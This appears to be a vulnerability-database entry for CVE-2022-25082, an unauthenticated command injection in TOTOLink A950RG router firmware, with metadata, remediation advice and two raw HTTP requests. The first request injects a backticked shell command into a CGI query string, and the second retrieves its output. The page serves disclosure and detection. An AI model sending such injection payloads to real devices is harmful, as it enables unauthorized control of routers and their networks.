---
layout: "post"
cve_id: "CVE-2022-25082"
title: "TOTOLink - Unauthenticated Command Injection"
pcap: true
pcap_path: "/pcaps/2022/CVE-2022-25082.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2022/CVE-2022-25082.yaml"
author: "gy741"
severity: "critical"
impact: "Successful exploitation of this vulnerability can lead to unauthorized access, data leakage, and potential compromise of the entire network.
"
remediation: "Apply the latest firmware update provided by the vendor to fix the command injection vulnerability.
"
reference:
  - "https://nvd.nist.gov/vuln/detail/cve-2022-25082"
  - "https://github.com/EPhaha/IOT_vuln/blob/main/TOTOLink/A950RG/README.md"
  - "https://github.com/ARPSyndicate/kenzer-templates"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2022-25082"
  cwe-id: "CWE-78"
  epss-score: 0.89173
  epss-percentile: 0.99505
  cpe: "cpe:2.3:o:totolink:a950rg_firmware:4.1.2cu.5204_b20210112:*:*:*:*:*:*:*"
metadata:
  max-request: 2
  vendor: "totolink"
  product: "a950rg_firmware"
tags:
  - "cve"
  - "cve2022"
  - "totolink"
  - "router"
  - "unauth"
  - "rce"
  - "iot"
  - "intrusive"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## ðŸ” Vulnerability Description
TOTOLink A950RG V5.9c.4050_B20190424 and V4.1.2cu.5204_B20210112 were discovered to contain a command injection vulnerability in the Main function. This vulnerability allows attackers to execute arbitrary commands via the QUERY_STRING parameter.


## ðŸŒ HTTP Request
```nohighlight
GET /cgi-bin/downloadFlile.cgi?payload=`ls>../36hH0qHpG6aryjltWVUpe6phTnD` HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1
Connection: close
Accept-Encoding: gzip
```

```nohighlight
GET /36hH0qHpG6aryjltWVUpe6phTnD HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:1.9.5.20) Gecko/ Firefox/13.0
Connection: close
Accept-Encoding: gzip
```


